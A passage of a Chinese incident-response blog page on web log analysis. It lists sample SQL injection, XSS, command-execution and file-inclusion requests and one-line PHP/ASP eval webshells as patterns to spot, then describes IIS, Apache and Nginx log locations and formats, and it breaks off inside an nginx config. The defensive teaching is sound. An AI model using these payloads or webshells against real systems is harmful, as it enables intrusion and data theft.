@@ -1,0 +1,829 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>应急响应之日志分析 - SafeKiller Zone</title>
+
+  
+    <meta name="description" content="攻击容易出现的位置 GET、POST请求报文的url字段 GET、POST请求报文的cookie字段 GET、POST请求报文的reffer字段 GET、POST请求报文的user-agent字段 POST请求报文的表单字段  常见攻击语句SQL注入 探测语句 http:&#x2F;&#x2F;xxx&#x2F;news.php?id&#x3D;23%20and%201&#x3D;1 http:&#x2F;&#x2F;xxx&#x2F;news.php?id&#x3D;23%20and">
+<meta property="og:type" content="article">
+<meta property="og:title" content="应急响应之日志分析">
+<meta property="og:url" content="https://jiangjiyue.github.io/2024/07/04/9e820566/index.html">
+<meta property="og:site_name" content="SafeKiller Zone">
+<meta property="og:description" content="攻击容易出现的位置 GET、POST请求报文的url字段 GET、POST请求报文的cookie字段 GET、POST请求报文的reffer字段 GET、POST请求报文的user-agent字段 POST请求报文的表单字段  常见攻击语句SQL注入 探测语句 http:&#x2F;&#x2F;xxx&#x2F;news.php?id&#x3D;23%20and%201&#x3D;1 http:&#x2F;&#x2F;xxx&#x2F;news.php?id&#x3D;23%20and">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951953.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951991.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951767.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951665.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951205.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951611.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951041.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181952432.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181952133.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181952512.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181952247.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181952558.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181952399.png">
+<meta property="article:published_time" content="2024-07-04T10:34:49.000Z">
+<meta property="article:modified_time" content="2024-07-18T11:54:36.000Z">
+<meta property="article:author" content="Kill3r">
+<meta property="article:tag" content="应急响应">
+<meta property="article:tag" content="日志分析">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407181951953.png">
+  
+  
+  
+  <meta name="keywords" content="应急响应,日志分析">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="SafeKiller Zone" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.27.0">
+
+  
+    <link rel="shortcut icon" href="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg">
+  
+
+  
+
+  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link rel="stylesheet" href="/css/darkmode.css">
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">SafeKiller Zone</div><div class="sub normal cap">安全学的再好又有什么用</div><div class="sub hover cap" style="opacity:0"> 连自己喜欢的人都留不住</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="更多" href="/tools/" style="color:#d55afa"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2s10 4.477 10 10" opacity=".5"/><path fill="currentColor" d="M12.75 9a.75.75 0 0 0-1.5 0v2.25H9a.75.75 0 0 0 0 1.5h2.25V15a.75.75 0 0 0 1.5 0v-2.25H15a.75.75 0 0 0 0-1.5h-2.25z"/></svg></a></nav>
+</div>
+<div class="widgets">
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">专栏：EmergencyResponse</span></div><div class="widget-body"><a class="item" href="/2024/07/03/ac635236/"><span class="title">应急响应-从攻击谈防守</span></a><a class="item active" href="/2024/07/04/9e820566/"><span class="title">应急响应之日志分析</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a><a class="item" href="/2024/07/05/4677b70c/"><span class="title">应急响应之Splunk</span></a><a class="item" href="/2024/07/06/b7b8d727/"><span class="title">应急响应之Windows</span></a><a class="item" href="/2024/07/07/69563a36/"><span class="title">应急响应靶机训练-Web1</span></a><a class="item" href="/2024/07/08/f05f6b8c/"><span class="title">应急响应靶机训练-Web2</span></a><a class="item" href="/2024/07/15/87585b1a/"><span class="title">应急响应靶机训练-Web3</span></a><a class="item" href="/2024/07/16/b7b8d727/"><span class="title">应急响应之Linux</span></a><a class="item" href="/2024/07/16/29554557/"><span class="title">应急响应靶机训练-Linux1</span></a><a class="item" href="/2024/07/17/b05c14ed/"><span class="title">应急响应靶机训练-Linux2</span></a></div></widget>
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2024/07/04/9e820566/"><span class="title">应急响应之日志分析</span></a><a class="item title" href="/2024/07/05/4677b70c/"><span class="title">应急响应之Splunk</span></a><a class="item title" href="/2024/07/08/f05f6b8c/"><span class="title">应急响应靶机训练-Web2</span></a><a class="item title" href="/2024/07/06/b7b8d727/"><span class="title">应急响应之Windows</span></a><a class="item title" href="/2024/07/16/b7b8d727/"><span class="title">应急响应之Linux</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/JiangJiYue/" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-github"></i></a><a class="social" href="javaScript:hud.toast('你在听🎵啦啦啦~');" rel="noopener noreferrer"><i class="fa-solid fa-music"></i></a><a class="social" href="https://space.bilibili.com/238008115" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-bilibili fa-bounce"></i></a><a class="social" href="/atom.xml" rel="noopener noreferrer"><i class="fa-solid fa-rss fa-shake"></i></a><a class="social" href="/comments/" rel="noopener noreferrer"><i class="fa-regular fa-comment-dots"></i></a><a class="social" href="javaScript:void(0);" rel="noopener noreferrer"><i class="fa-solid fa-circle-half-stroke fa-flip"></i></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/topic">专栏</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/2024/07/03/ac635236/">EmergencyResponse</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-07-04T10:34:49.000Z">2024-07-04</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-07-18T11:54:36.000Z">2024-07-18</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>应急响应之日志分析</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h2 id="攻击容易出现的位置"><a href="#攻击容易出现的位置" class="headerlink" title="攻击容易出现的位置"></a>攻击容易出现的位置</h2><ul>
+<li>GET、POST请求报文的url字段</li>
+<li>GET、POST请求报文的cookie字段</li>
+<li>GET、POST请求报文的reffer字段</li>
+<li>GET、POST请求报文的user-agent字段</li>
+<li>POST请求报文的表单字段</li>
+</ul>
+<h2 id="常见攻击语句"><a href="#常见攻击语句" class="headerlink" title="常见攻击语句"></a>常见攻击语句</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><ul>
+<li>探测语句<ul>
+<li><code>http://xxx/news.php?id=23%20and%201=1</code></li>
+<li><code>http://xxx/news.php?id=23%20and%201=2</code></li>
+<li><code>http://xxx/news.php?id=23</code></li>
+</ul>
+</li>
+<li>查询语句<ul>
+<li><code>and exists(select * from admin)</code></li>
+<li><code>and+(select+top+1+asc(mid(username,2,1))+from+Admin)&gt;100</code></li>
+<li><code>union select 1,2,table_name from information_schema.tables where table_schema=database()#</code></li>
+<li><code>union select user,2,password from users#</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><ul>
+<li><code>&lt;script&gt;alert(/xss/);&lt;/script&gt;</code></li>
+<li><code>&lt;a href=javascript:alert(&#39;test&#39;)&gt;adfasdfasdf&lt;/a&gt;</code></li>
+<li><code>&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</code></li>
+<li><code>&lt;img src=&quot;x&quot; onerror=&quot;alert(/xss/)&quot;/&gt;</code></li>
+</ul>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><ul>
+<li><code>GET /xx/xx/index.php?do=phpinfo</code></li>
+<li><code>GET /x.php?id=/winnt/system32/cmd.exe?/c+dir+c:%5c</code></li>
+<li><code>GET /cgi/ptcmd.cgi?cmd=;cat+/tmp/user.ini</code></li>
+</ul>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><ul>
+<li><code>GET /xx/xx.php?file=../../etc/passwd</code></li>
+<li><code>GET /xx/xx.php?file=http://xx/1.php</code></li>
+<li><code>php://filter/read=convert.base64-encode/resource=index.php</code></li>
+</ul>
+<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><ul>
+<li><code>&lt;?php @eval($_POST[&#39;v&#39;]);?&gt;</code></li>
+<li><code>&lt;%eval request(&quot;v&quot;)%&gt;</code></li>
+<li><code>&lt;%execute(request(&quot;admin&quot;))%&gt;</code></li>
+</ul>
+<h2 id="常见日志"><a href="#常见日志" class="headerlink" title="常见日志"></a>常见日志</h2><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><ol>
+<li><code>%SystemDrive%\inetpub\logs\LogFiles\</code></li>
+<li><code>%SystemRoot%\system32\LogFiles\W3SVC1</code></li>
+<li><code>%SystemDrive%\inetpub\LogFiles\W3SVC1</code></li>
+<li><code>%SystemDrive%\Windows\System32\LogFiles\HTTPERR</code></li>
+<li><code>%systemroot%\system32\logfiles\MSFTPSVC1\</code></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 日志格式</span></span><br><span class="line"><span class="comment">#Software: Microsoft Internet Information Services 7.5</span></span><br><span class="line"><span class="comment">#Version: 1.0</span></span><br><span class="line"><span class="comment">#Date: 2013-08-21 01:00:00</span></span><br><span class="line"><span class="comment">#Fields: date time s-sitename s-computername s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs-version cs(User-Agent) cs(Cookie) cs(Referer) cs-host sc-status sc-substatus sc-win32-status sc-bytes cs-bytes time-taken</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># date：日期，记录请求发生的日期和时间。</span></span><br><span class="line"><span class="comment"># time：时间，记录请求发生的具体时间。</span></span><br><span class="line"><span class="comment"># s-sitename：网站名称，表示接收请求的站点的名称。</span></span><br><span class="line"><span class="comment"># s-computername：计算机名称，指示接收请求的服务器的名称或标识符。</span></span><br><span class="line"><span class="comment"># s-ip：服务器IP地址，表示接收请求的服务器的IP地址。</span></span><br><span class="line"><span class="comment"># cs-method：客户端请求方法，指示客户端使用的HTTP请求方法（如GET、POST等）。</span></span><br><span class="line"><span class="comment"># cs-uri-stem：URI路径，指示请求的页面或资源的路径部分。</span></span><br><span class="line"><span class="comment"># cs-uri-query：URI查询字符串，包含附加到请求的查询参数。</span></span><br><span class="line"><span class="comment"># s-port：服务器端口，表示接收请求的服务器的端口号。</span></span><br><span class="line"><span class="comment"># cs-username：客户端用户名，如果客户端进行身份验证，则表示进行身份验证的用户名。</span></span><br><span class="line"><span class="comment"># c-ip：客户端IP地址，表示发出请求的客户端的IP地址。</span></span><br><span class="line"><span class="comment"># cs-version：客户端协议版本，指示客户端使用的HTTP协议版本。</span></span><br><span class="line"><span class="comment"># cs(User-Agent)：客户端User-Agent，表示客户端使用的浏览器或其他用户代理的标识符。</span></span><br><span class="line"><span class="comment"># cs(Cookie)：客户端Cookie，表示客户端发送的包含Cookie信息的请求头。</span></span><br><span class="line"><span class="comment"># cs(Referer)：引用页面，表示引导客户端到当前页面的来源页面。</span></span><br><span class="line"><span class="comment"># cs-host：主机名，表示服务器接收请求的主机名。</span></span><br><span class="line"><span class="comment"># sc-status：状态码，指示服务器响应的HTTP状态码。</span></span><br><span class="line"><span class="comment"># sc-substatus：子状态码，进一步细化HTTP状态码的信息。</span></span><br><span class="line"><span class="comment"># sc-win32-status：Windows状态码，指示底层操作系统返回的错误或状态代码。</span></span><br><span class="line"><span class="comment"># sc-bytes：发送字节数，表示服务器发送给客户端的响应字节数。</span></span><br><span class="line"><span class="comment"># cs-bytes：接收字节数，表示客户端发送给服务器的请求字节数。</span></span><br><span class="line"><span class="comment"># time-taken：处理时间，表示服务器处理请求所花费的时间，以毫秒为单位。</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><ol>
+<li><code>/var/log/httpd/access.log</code></li>
+<li><code>/var/log/apache/access.log</code></li>
+<li><code>/var/log/apache2/access.log</code></li>
+<li><code>/var/log/httpd-access.log</code></li>
+<li><code>windows：&lt;Apache安装目录&gt;\logs\access.log | error.log</code></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">10.11.35.94 - - [30/Sep/2019:08:53:33 +0800] <span class="string">&quot;GET /index.php?action=view&amp;mod=chgavatar HTTP/1.1&quot;</span> 302 357 <span class="string">&quot;http://10.20.124.219/index.php?action=view&amp;mod=percenter&quot;</span> <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&quot;</span></span><br><span class="line"></span><br><span class="line">1. 10.11.35.94 - 访问者的IP地址。这是发起请求的客户端的IP地址。</span><br><span class="line">2. - - 用户标识符（通常未使用，表示为-）。</span><br><span class="line">3. - - 用户认证标识符（通常未使用，表示为-）。</span><br><span class="line">4. [30/Sep/2019:08:53:33 +0800] - 请求的时间戳，表示请求的日期和时间。格式为[day/month/year:hour:minute:second timezone]。</span><br><span class="line">5. <span class="string">&quot;GET /index.php?action=view&amp;mod=chgavatar HTTP/1.1&quot;</span> - 实际的HTTP请求行，包括请求方法（GET）、请求的URL路径（/index.php?action=view&amp;mod=chgavatar）、和HTTP协议版本（HTTP/1.1）。</span><br><span class="line">6. 302 - HTTP状态码，表示服务器对请求的响应状态。302表示重定向。</span><br><span class="line">7. 357 - 响应的字节数，表示服务器返回内容的大小。</span><br><span class="line">8. <span class="string">&quot;http://10.20.124.219/index.php?action=view&amp;mod=percenter&quot;</span> - 引用页面（Referer），表示发起请求的来源页面。</span><br><span class="line">9. <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&quot;</span> - 用户代理字符串，表示发起请求的客户端软件的信息（比如操作系统和浏览器版本）。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><ol>
+<li><code>/usr/local/nginx/logs</code><ul>
+<li><code>access.log</code>代表访问日志</li>
+<li><code>error.log</code>代表错误日志</li>
+</ul>
+</li>
+<li><code>/var/log/nginx/error.log</code></li>
+<li><code>/var/log/nginx/access.log</code></li>
+</ol>
+<p>同<code>Apache</code>,通常情况下Nginx可自定义为以下格式</p>
+<figure class="highlight bash"><figcaption><span>nginx.conf</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改日志模式</span></span><br><span class="line"> <span class="comment"># json 为规则名字 escape=json 设置日志文件格式为json</span></span><br><span class="line">     log_format json escape=json <span class="string">&#x27;&#123;&quot;@timestamp&quot;:&quot;$time_iso8601&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;domain&quot;:&quot;$host&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;host&quot;:&quot;$server_addr&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;clientip&quot;:&quot;$remote_addr&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;remote_user&quot;:&quot;$remote_user&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;request&quot;:&quot;$request&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;request_method&quot;:&quot;$request_method&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;uri&quot;:&quot;$uri&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;request_time&quot;:&quot;$request_time&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;status&quot;:&quot;$status&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;http_referrer&quot;:&quot;$http_referer&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;body_bytes_sent&quot;:&quot;$body_bytes_sent&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;xff&quot;:&quot;$http_x_forwarded_for&quot;,&#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;&quot;http_user_agent&quot;:&quot;$http_user_agent&quot;,&#x27;</span></span><br><span class="line">                                 <span 